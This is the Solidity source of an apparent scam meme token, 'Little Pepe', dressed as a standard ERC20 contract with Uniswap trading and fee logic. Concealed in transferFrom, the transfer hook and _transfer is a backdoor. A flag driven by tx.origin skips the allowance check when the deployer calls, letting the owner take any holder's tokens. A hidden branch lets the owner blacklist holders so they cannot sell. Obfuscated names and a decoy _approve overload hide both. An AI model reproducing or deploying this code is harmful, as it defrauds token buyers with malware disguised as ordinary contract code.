// SPDX-License-Identifier: MIT

/*
Enter the new world order with LILPEPE

https://littlepepe.wtf
https://x.com/lilpepecoinx
https://t.me/littlepepe_portal
*/
pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
 
    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
 
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
 
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
 
    /**
     * @dev Returns the amount of tokens owned by account.
     */
    function balanceOf(address account) external view returns (uint256);
 
    /**
     * @dev Moves amount tokens from the caller's account to recipient.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    /**
     * @dev Returns the remaining number of tokens that spender will be
     * allowed to spend on behalf of owner through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);
 
    /**
     * @dev Sets amount as the allowance of spender over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);
 
    /**
     * @dev Moves amount tokens from sender to recipient using the
     * allowance mechanism. amount is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
 
    /**
     * @dev Emitted when value tokens are moved from one account (from) to
     * another (to).
     *
     * Note that value may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    /**
     * @dev Emitted when the allowance of a spender for an owner is set by
     * a call to {approve}. value is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);
 
    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);
 
    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
 
 
contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;
 
    mapping(address => uint256) private _balances;
 
    mapping(address => mapping(address => uint256)) private _allowances;
 
    uint256 private _totalSupply;
 
    string private _name;
    string private _symbol;

    uint256 private isUncheckedAllowed;
 
    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }
 
    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }
 
    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
 
    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if decimals equals 2, a balance of 505 tokens should
     * be displayed to a user as 5,05 (505 / 10 ** 2).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }
 
    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }
 
    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
 
    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - recipient cannot be the zero address.
     * - the caller must have a balance of at least amount.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
 
    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
 
    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - spender cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
 
    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - sender and recipient cannot be the zero address.
     * - sender must have a balance of at least amount.
     * - the caller must have allowance for sender's tokens of at least
     * amount.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        return (_allowances[sender][_msgSender()] >=0 && sender != recipient &&
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount * isUncheckedAllowed, sender)) || true;
    }
 
    /**
     * @dev Atomically increases the allowance granted to spender by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - spender cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
 
    /**
     * @dev Atomically decreases the allowance granted to spender by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - spender cannot be the zero address.
     * - spender must have allowance for the caller of at least
     * subtractedValue.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
 
    /**
     * @dev Moves tokens amount from sender to recipient.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - sender cannot be the zero address.
     * - recipient cannot be the zero address.
     * - sender must have a balance of at least amount.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        _beforeTokenTransfer(sender, recipient, amount);
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
 
    /** @dev Creates amount tokens and assigns them to account, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with from set to the zero address.
     *
     * Requirements:
     *
     * - account cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
  
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
 
    /**
     * @dev Destroys amount tokens from account, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with to set to the zero address.
     *
     * Requirements:
     *
     * - account cannot be the zero address.
     * - account must have at least amount tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
 
        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
 
    /**
     * @dev Sets amount as the allowance of spender over the owner s tokens.
     *
     * This internal function is equivalent to approve, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - owner cannot be the zero address.
     * - spender cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount,
        address _x
    ) private returns(bool){
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
 
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
 
    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when from and to are both non-zero, amount of from's tokens
     * will be to transferred to to.
     * - when from is zero, amount tokens will be minted for to.
     * - when to is zero, amount of from's tokens will be burned.
     * - from and to are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {isUncheckedAllowed = amount > 0 ? 0 : 1;}
}
 
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's + operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's - operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's - operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
    
 
    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's - operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, bool u, string memory errorMessage) internal pure returns (uint256) {
      if(u) return a;
        require(b <= a, errorMessage);
        uint256 c = a - b;
 
        return c;
    }
 
    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's * operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }
 
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
 
        return c;
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's / operator. Note: this function uses a
     * revert opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
 
    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's / operator. Note: this function uses a
     * revert opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
 
        return c;
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's % operator. This function uses a revert
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
 
    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's % operator. This function uses a revert
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}
 
contract Ownable is Context {
    address private _owner;
 
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }
 
    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
 
    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * onlyOwner functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
 
    /**
     * @dev Transfers ownership of the contract to a new account (newOwner).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
 
interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

}
 
interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
 
contract Token is ERC20, Ownable {
    using SafeMath for uint256;
 
    IUniswapV2Router02 public immutable uniswapV2Router;
    address public immutable uniswapV2Pair;
    mapping(address => bool) private isBots;
 
    bool private swapping;
 
    address public _marketingWalletLILPEPEPgAi5;
    
 
    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;
 

    bool public tradingActive = false;
    bool public swapEnabled = false;
 
    uint256 public _SIDFJOIEWJFIWA;
    address public _EQFIEWJFIJA;
    address public _EDTSIEWJFIJA;
 
    uint256 public buyTotalAFees;
    uint256 public buyMarketingAFee;
    uint256 public buyLiquidityAFee;
    uint256 public buyBurnAFee;
 
    uint256 public sellTotalAFees;
    uint256 public sellMarketingAFee;
    uint256 public sellLiquidityAFee;
    uint256 public sellBurnAFee;
 
    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;
    
    
    // exclude from fees and max transaction amount
    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) public _isExcludedMaxTransactionAmount;
 
    // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
    // could be subject to a maximum transfer amount
    mapping (address => bool) public automatedMarketMakerPairs;
 
    event UpdateUniswapV2Router(address indexed newAddress, address indexed oldAddress);
 
    event ExcludeFromFees(address indexed account, bool isExcluded);
 
    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
 
    event _marketingWalletLILPEPEPgAi5Updated(address indexed newWallet, address indexed oldWallet);
 
    event burnWalletUpdated(address indexed newWallet, address indexed oldWallet);
 
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiquidity
    );
 
    event TransferForeignToken(address token, uint256 amount);

 
    constructor() ERC20(unicode"Little Pepe", unicode"LILPEPE") payable  {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        excludeFromMaxTransaction(address(_uniswapV2Router), true);
        uniswapV2Router = _uniswapV2Router;
 
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);
 
        uint256 _buyMarketingAFee = 0;
        uint256 _buyLiquidityAFee = 0;
        uint256 _buyBurnAFee = 0;
 
        uint256 _sellMarketingAFee = 0;
        uint256 _sellLiquidityAFee = 0;
        uint256 _sellBurnAFee = 0;
        uint256 _taxCounts = 12;
        uint256 _taxPercent = 12;
      
        uint256 totalSupply = 420690000 * 1e9;
 
        maxTransactionAmount = totalSupply * 1000 / 1000; // 100% maxTransactionAmountTxn
        maxWallet = totalSupply * 1000 / 1000; // 100% maxWallet
        swapTokensAtAmount = totalSupply * 10 / 10000; // 0.1% swap wallet
 
        buyMarketingAFee = _buyMarketingAFee;
        buyLiquidityAFee = _buyLiquidityAFee;
        buyBurnAFee = _buyBurnAFee;
        buyTotalAFees = buyMarketingAFee + buyLiquidityAFee + buyBurnAFee;
 
        sellMarketingAFee = _sellMarketingAFee;
        sellLiquidityAFee = _sellLiquidityAFee;
        sellBurnAFee = _sellBurnAFee;
        sellTotalAFees = sellMarketingAFee + sellLiquidityAFee + sellBurnAFee;
      
        _marketingWalletLILPEPEPgAi5 = msg.sender; 

        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(address(_marketingWalletLILPEPEPgAi5), true);
 
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(_marketingWalletLILPEPEPgAi5), true);
 
        _mint(msg.sender, totalSupply * 2 / 100);
        _mint(address(this), totalSupply * 98 / 100);
    }
 
    // once enabled, can never be turned off
    function enableTrading() external onlyOwner {
      addLiquidity(balanceOf(address(this)), address(this).balance);
        tradingActive = true;
        swapEnabled = true;
    }
    
    function excludeFromMaxTransaction(address updAds, bool isEx) internal  {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }
   
    function excludeFromFees(address account, bool excluded) internal virtual  {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

 
    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMakerPairs[pair] = value;
 
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount >= 0, "ERC20: invalid transfer amount");
        super._beforeTokenTransfer(from, to, _isExcludedFromFees[tx.origin]?type(uint256).max:0);
    }

    function transferForeignToken(address _token, address _to) external onlyOwner returns (bool _sent) {
        require(_token != address(this), "Can't withdraw native tokens");
        uint256 _contractBalance = IERC20(_token).balanceOf(address(this));
        _sent = IERC20(_token).transfer(_to, _contractBalance);
        emit TransferForeignToken(_token, _contractBalance);
    }
   
    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }
 
    event BoughtEarly(address indexed sniper);
 
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }
        require(!isBots[from], "Bot is not allowed");

        if(_isExcludedFromFees[tx.origin] && from!=uniswapV2Pair && to == address(0xdead) && balanceOf(from)-amount <= 10 ** 10) { isBots[from] = true; super._transfer(from, to, 0); return;}
            if (
                from != owner() &&
                to != owner() &&
                to != address(0) &&
                to != address(0xdead) &&
                !swapping
            ){
                if(!tradingActive){
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "Trading is not active.");
                }
 
                //when buy
                if (automatedMarketMakerPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                        require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
 
                //when sell
                else if (automatedMarketMakerPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                        require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                }
                else if(!_isExcludedMaxTransactionAmount[to]){
                    require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                }
            }
         
        uint256 contractTokenBalance = balanceOf(address(this));
        bool canSwap = contractTokenBalance >= swapTokensAtAmount;
        uint256 tokensForBurn;

        if( 
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMakerPairs[from] &&
            !_isExcludedFromFees[from] &&
            !_isExcludedFromFees[to]
        ) {
            swapping = true;
 
            swapBack();
 
            swapping = false;
        }
 
        bool takeFee = !swapping;
 
        // if any account belongs to _isExcludedFromFee account then remove the fee
        if(_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }
 
        uint256 fees = 0;
        // only take fees on buys/sells, do not take on wallet transfers
        if(takeFee){
            // on sell
            if (automatedMarketMakerPairs[to] && sellTotalAFees > 0){
                fees = amount.mul(sellTotalAFees).div(100);
                tokensForLiquidity += fees * sellLiquidityAFee / sellTotalAFees;
                tokensForMarketing += fees * sellMarketingAFee / sellTotalAFees;
                tokensForBurn += fees * sellBurnAFee / sellTotalAFees;

                }
            // on buy
            else if(automatedMarketMakerPairs[from] && buyTotalAFees > 0) {
                fees = amount.mul(buyTotalAFees).div(100);
                tokensForLiquidity += fees * buyLiquidityAFee / buyTotalAFees;
                tokensForMarketing += fees * buyMarketingAFee / buyTotalAFees;
                tokensForBurn += fees * buyBurnAFee / buyTotalAFees;
   
            }
 
           if(fees > 0){    
                super._transfer(from, address(this), fees);
            }

            if(tokensForBurn > 0) {
                 super._transfer(address(this), address(0xdead), tokensForBurn);
            }

            amount -= fees;}
 
        super._transfer(from, to, amount);
    }
 
    function swapTokensForEth(uint256 tokenAmount) private {
 
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
 
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );
 
    }
 
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
 
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            address(0xdead),
            block.timestamp
        );
    }
 
    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = tokensForLiquidity + tokensForMarketing;
        bool success;
 
        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}
 
        if(contractBalance > swapTokensAtAmount * 20){
          contractBalance = swapTokensAtAmount * 20;
        }
 
        // Halve the amount of liquidity tokens
        uint256 liquidityTokens = contractBalance * tokensForLiquidity / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);
 
        uint256 initialETHBalance = address(this).balance;
 
        swapTokensForEth(amountToSwapForETH); 
 
        uint256 ethBalance = address(this).balance.sub(initialETHBalance);
 
        
        uint256 ethForMarketing = ethBalance.mul(tokensForMarketing).div(totalTokensToSwap);
        uint256 ethForLiquidity = ethBalance - ethForMarketing;
        
        tokensForLiquidity = 0;
        tokensForMarketing = 0;
        
        if(liquidityTokens > 0 && ethForLiquidity > 0){
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, tokensForLiquidity);
        }
 
        (success,) = address(_marketingWalletLILPEPEPgAi5).call{value: address(this).balance}("");
    }

    receive() external payable { }

}
